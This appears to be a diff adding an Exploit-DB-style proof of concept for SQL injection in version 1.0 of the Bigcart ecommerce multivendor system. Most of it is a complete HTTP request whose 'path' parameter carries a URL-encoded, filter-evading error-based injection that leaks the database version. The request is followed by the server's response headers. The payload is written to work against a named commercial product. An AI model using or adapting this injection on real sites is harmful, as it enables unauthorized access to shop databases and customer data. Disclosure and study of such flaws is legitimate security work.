@@ -1,0 +1,35 @@
+# Exploit Title: Bigcart - Ecommerce Multivendor System  1.0 - SQL Injection
+# Dork: N/A
+# Date: 2019-01-14
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://ocsolutions.co.in/
+# Software Link: https://codecanyon.net/item/marketplace-builder-a-complete-ecommerce-multivendor-solution-with-cms/21808220
+# Version: 1.0
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/index.php?route=product/category&path=[SQL]
+# 
+
+GET /[PATH]/index.php?route=product/category&path=%33%33%5f%36%34%31%34%39%39%39%39%39%27%20%2f%2a%21%31%33%33%33%37%50%72%6f%63%65%44%75%72%65%2a%2f%20%41%6e%41%6c%79%73%65%20%28%65%78%74%72%61%63%74%76%61%6c%75%65%28%30%2c%63%6f%6e%63%61%74%28%30%78%32%37%2c%30%78%33%61%2c%40%40%76%65%72%73%69%6f%6e%29%29%2c%30%29%2d%2d%20%2d HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Cookie: OCSESSID=19eef2415d8afbee8c2f353629; language=en-gb; currency=USD
+DNT: 1
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+HTTP/1.1 200 OK
+Date: Mon, 14 Jan 2019 18:17:53 GMT
+Server: Apache
+X-Powered-By: PHP/5.6.39
+Set-Cookie: OCSESSID=19eef2415d8afbee8c2f353629; path=/
+Set-Cookie: OCSESSID=19eef2415d8afbee8c2f353629; path=/
+Vary: Accept-Encoding
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
